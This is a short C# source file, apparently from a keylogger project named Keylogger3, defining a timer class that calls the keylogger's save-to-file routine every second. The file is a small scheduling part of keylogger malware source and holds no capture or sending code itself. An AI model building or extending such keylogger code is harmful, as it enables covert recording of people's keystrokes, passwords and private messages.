using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using Modules.Keylogger;

namespace Keylogger3.Modules
{
    public sealed class CountDownSave
    {
        private readonly Timer _timer;
        public CountDownSave()
        {
            _timer = new Timer(1000) { AutoReset = true };
            _timer.Elapsed += TimerElapsed;
        }
        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            Keylogger.SaveToFile();
        }
        public void Start()
        {
            _timer.Start();
        }
        public void Stop()
        {
            _timer.Stop();
        }
    }
}

